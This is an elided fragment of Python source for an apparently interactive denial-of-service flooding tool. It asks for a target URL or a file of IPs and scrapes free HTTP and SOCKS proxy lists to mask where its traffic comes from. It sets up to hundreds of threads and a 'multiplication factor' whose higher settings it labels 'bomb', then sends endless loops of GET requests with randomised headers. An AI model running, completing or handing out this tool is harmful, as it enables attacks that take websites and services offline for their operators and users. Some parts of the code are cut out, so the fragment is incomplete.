...
def start_url():
    global url, url2, urlport, choice1, ips
    choice1 = input("\nSelect target: [0] Single URL/IP, [1] Multiple IPs from file > ")
    if choice1 == "1":
        ip_file = input("Enter the path to the IP list file > ")
        try:
        ...
        url = input("\nEnter URL or IP (e.g., http://example.com or 192.168.1.1): ").strip()
        if not url:
        ...
        try:
            ...
            if ":" in clean_url:
                url2, urlport = clean_url.split(":")
            else:
                url2 = clean_url
                urlport = "443" if url.startswith("https://") else "80"
        except Exception as e:
...
def proxy_mode():
    global choice2
    choice2 = input("Enable proxy/socks mode? [y/N] > ").lower()
    if choice2 == "y":
        choose_proxy_socks()
    else:
        num_threads()

def choose_proxy_socks():
    global choice3
    choice3 = input("Select mode: [0] HTTP Proxy, [1] Socks > ")
    if choice3 == "0":
        choose_download_proxy()
    elif choice3 == "1":
        choose_download_socks()
    else:
        print("Invalid choice. Please select 0 or 1.")
        choose_proxy_socks()

def choose_download_proxy():
    choice4 = input("Download a new proxy list? [y/N] > ").lower()
    if choice4 == "y":
        proxy_get("http://free-proxy-list.net/")
    else:
        proxy_list()

def choose_download_socks():
    choice4 = input("Download a new socks list? [y/N] > ").lower()
    if choice4 == "y":
        proxy_get("https://www.socks-proxy.net/")
    else:
        proxy_list()

def proxy_get(urlproxy):
    try:
        req = urllib.request.Request(urlproxy)
        req.add_header("User-Agent", random.choice(useragents))
        with urllib.request.urlopen(req) as sourcecode:
            part = sourcecode.read().decode()
            part = part.split("<tbody>")[1].split("</tbody>")[0].split("<tr><td>")
            proxies = ""
            for proxy in part:
                proxy = proxy.split("</td><td>")
                try:
                    proxies += f"{proxy[0]}:{proxy[1]}\n"
                except:
                    pass
...
def proxy_list():
    global proxies
    out_file = input("Enter the proxy list filename/path (default: proxy.txt) > ").strip() or "proxy.txt"
    try:
...
def num_threads():
    global threads
    try:
        threads = int(input("Enter number of threads (default: 800) > ") or 800)
    except ValueError:
        threads = 800
        print("Using default: 800 threads.")
    multiplication()

def multiplication():
    global multiple
    try:
        multiple = int(input("Enter multiplication factor (1-5=normal, 50=powerful, 100+=bomb) > "))
    except ValueError:
...
def loop():
    global threads, acceptall, connection, go, x
    acceptall = [
...
class RequestProxyHTTP(threading.Thread):
    ...
    def run(self):
        ...
        get_host = f"GET {random.choice(ips) if choice1 == '1' else url} HTTP/1.1\r\nHost: {random.choice(ips) if choice1 == '1' else url2}\r\n"
        request = get_host + useragent + accept + forward + connection + "\r\n"
        current = self.counter - 1
        proxy = proxies[current].strip().split(':') if current < len(proxies) else random.choice(proxies).strip().split(":")
        go.wait()
        while True:
            try:
        ...
        while True:
            try:
                ...
                try:
                    ...
                    print(f"Socks proxy down. Retrying request @ {self.counter}")
                    s.close()
